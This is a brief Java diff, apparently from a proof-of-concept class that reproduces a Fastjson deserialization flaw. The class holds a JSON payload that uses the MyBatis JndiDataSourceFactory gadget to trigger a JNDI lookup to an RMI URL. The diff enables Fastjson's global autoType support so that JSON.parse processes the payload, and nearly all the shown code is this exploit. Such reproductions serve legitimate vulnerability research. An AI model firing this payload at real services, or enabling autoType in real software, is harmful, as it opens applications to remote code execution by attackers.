@@ -19,7 +19,7 @@ public class Fastjson1245 {
          */
 
         String payload2 = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/obj\"}";
-//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
         JSON.parse(payload2);
     }
 }
